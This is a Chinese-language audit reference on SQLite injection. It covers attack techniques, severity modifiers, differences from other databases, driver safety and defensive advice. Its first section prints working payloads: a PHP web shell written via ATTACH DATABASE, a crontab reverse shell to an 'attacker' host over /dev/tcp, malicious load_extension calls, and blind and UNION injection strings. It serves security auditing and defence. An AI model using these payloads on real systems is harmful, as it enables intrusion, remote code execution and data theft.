# SQLite — 引擎特异性知识

---

## 1. 注入特有技法

### 1.1 ATTACH DATABASE（文件写入/WebShell）

SQLite 最独特的攻击面：通过 `ATTACH DATABASE` 创建新的数据库文件（即任意文件写入）。

```sql
-- 写入 PHP WebShell
ATTACH DATABASE '/var/www/html/shell.php' AS evil;
CREATE TABLE evil.payload (data TEXT);
INSERT INTO evil.payload VALUES ('<?php system($_GET["cmd"]); ?>');

-- 写入 crontab（Linux 提权）
ATTACH DATABASE '/var/spool/cron/crontabs/www-data' AS cron;
CREATE TABLE cron.job (data TEXT);
INSERT INTO cron.job VALUES ('* * * * * /bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"');
```

**影响**：SQLite 注入在有文件系统写入权限的场景下可直接升级为 RCE。

### 1.2 load_extension（动态库加载）

```sql
-- 加载恶意共享库（需 load_extension 功能未被禁用）
SELECT load_extension('/tmp/evil.so');
SELECT load_extension('\\attacker\share\evil.dll');
```

**注意**：大多数 SQLite 绑定默认禁用 `load_extension`，但需确认。

### 1.3 信息收集

```sql
-- 版本信息
SELECT sqlite_version();

-- 所有表
SELECT name FROM sqlite_master WHERE type='table';

-- 表结构
SELECT sql FROM sqlite_master WHERE name='users';

-- 所有列
PRAGMA table_info(users);

-- 已附加的数据库
PRAGMA database_list;
```

### 1.4 盲注技术

```sql
-- 布尔盲注（SQLite 无 IF 函数，使用 CASE）
' AND CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN 1 ELSE 0 END = 1 --

-- 时间盲注（SQLite 无 SLEEP/WAITFOR，使用重计算制造延迟）
' AND CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END --

-- 使用 LIKE 的布尔盲注
' AND (SELECT hex(substr(username,1,1)) FROM users LIMIT 1) = '61' --
```

### 1.5 UNION 注入特性

```sql
-- SQLite 的 UNION 不要求列名匹配，只要列数一致
' UNION SELECT 1,2,3,4 --
' UNION SELECT sql,2,3,4 FROM sqlite_master --
' UNION SELECT group_concat(name),2,3,4 FROM sqlite_master WHERE type='table' --
```

---

## 2. 严重性修正因子

| 条件 | 修正 |
|------|------|
| 应用进程有 Web 目录写入权限 | **上调至 🔴 高危**（ATTACH DATABASE → WebShell → RCE） |
| `load_extension` 未禁用 | **上调至 🔴 高危**（可加载恶意动态库 → RCE） |
| 数据库文件路径可被用户控制 | **上调至 🔴 高危** |
| SQLite 为内存数据库（`:memory:`） | 降低影响（无法 ATTACH 到文件系统）|
| 应用为桌面/移动端（非服务器） | 影响范围受限于本地 |
| SQLite 作为缓存/临时存储 | 数据敏感度低，可下调 |

---

## 3. SQLite 与其他数据库的关键差异

| 特性 | SQLite | MySQL | PostgreSQL | MSSQL |
|------|--------|-------|------------|-------|
| 类型系统 | 动态（任何列可存任何类型） | 静态 | 静态 | 静态 |
| Stacked queries | 取决于驱动（多数不支持） | 取决于 API | 支持 | 默认支持 |
| 注释语法 | `--` 和 `/* */` | `--` `#` `/* */` | `--` `/* */` | `--` `/* */` |
| 字符串连接 | `\|\|` | `CONCAT()` | `\|\|` | `+` |
| SLEEP/延时 | 无原生支持 | `SLEEP(n)` | `pg_sleep(n)` | `WAITFOR DELAY` |
| 子查询 | 完全支持 | 完全支持 | 完全支持 | 完全支持 |
| 文件操作 | `ATTACH DATABASE` | `LOAD_FILE` / `INTO OUTFILE` | `COPY TO/FROM` | `xp_cmdshell` |

---

## 4. 各语言 SQLite 驱动的安全特性

| 驱动 | 语言 | Stacked Queries | load_extension 默认 | 参数化方式 |
|------|------|----------------|---------------------|-----------|
| `better-sqlite3` | Node.js | 支持（`.exec()`） | 禁用 | `stmt.run(val)` / `?` |
| `sqlite3` | Node.js | 不支持（`.run()` 单条） | 禁用 | `stmt.run(val)` / `?` / `$name` |
| `sqlite3` | Python | `.executescript()` 支持多条 | 禁用 | `cursor.execute(sql, (val,))` / `?` / `:name` |
| `mattn/go-sqlite3` | Go | `.Exec()` 支持多条 | 禁用 | `db.Query(sql, val)` / `?` |
| `Microsoft.Data.Sqlite` | C# | 不支持 | 禁用 | `@name` |
| `sqlite3-ruby` | Ruby | 取决于方法 | 禁用 | `db.execute(sql, val)` / `?` |

### 关键审计点

```javascript
// Node.js better-sqlite3 — exec() 支持多条语句
db.exec(userInput);  // 🔴 极其危险：可执行任意多条 SQL

// vs run() — 仅执行一条语句
db.prepare(userInput).run();  // 🔴 危险但仅一条语句

// Python sqlite3 — executescript() 支持多条
conn.executescript(user_sql)  // 🔴 极其危险

// vs execute() — 仅执行一条
conn.execute(user_sql)  // 🔴 危险但仅一条语句
```

---

## 5. 防御建议

1. **禁用 load_extension**：确认应用使用的 SQLite 绑定已禁用（大多数默认禁用）
2. **文件权限**：SQLite 数据库文件和应用进程不应拥有 Web 目录写入权限
3. **避免 `executescript` / `exec` 系列**：不要将用户输入传入支持多语句执行的 API
4. **内存数据库**：如果不需要持久化，使用 `:memory:` 减少 ATTACH 攻击面
5. **WAL 模式**：使用 WAL 模式不直接影响注入安全，但减少文件锁定导致的信息泄露
